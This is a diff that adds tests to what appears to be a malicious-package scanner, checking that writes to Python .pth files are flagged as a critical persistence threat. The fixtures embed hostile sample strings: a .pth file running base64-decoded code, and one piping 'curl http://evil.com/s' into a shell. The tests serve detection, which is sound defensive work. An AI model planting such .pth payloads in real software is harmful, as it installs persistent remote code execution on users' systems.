@@ -2719,6 +2719,45 @@ fetch('https://api.telegram.org/bot1234:ABCD/sendMessage', {
     } finally { cleanupTemp(tmp); }
   });
 
+  // === .pth persistence detection (LiteLLM/Checkmarx) ===
+
+  await asyncTest('AST: writeFileSync to .pth file → pth_persistence CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('/usr/lib/python3.11/site-packages/litellm_init.pth', 'import base64;exec(base64.b64decode("..."))');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'pth_persistence');
+      assert(t, 'Should detect pth_persistence for writeFileSync to .pth file');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: writeFileSync to .json file → NO pth_persistence', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('./config.json', '{"key": "value"}');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'pth_persistence');
+      assert(!t, 'writeFileSync to .json should NOT trigger pth_persistence');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: writeFile to arbitrary .pth path → pth_persistence CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFile('/tmp/evil.pth', 'import os; os.system("curl http://evil.com/s | sh")', () => {});
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'pth_persistence');
+      assert(t, 'Should detect pth_persistence for writeFile to any .pth path');
+    } finally { cleanupTemp(tmp); }
+  });
+
   await asyncTest('AST: fetch to trycloudflare.com → suspicious_domain MEDIUM', async () => {
     const tmp = makeTempPkg(`
 const https = require('https');
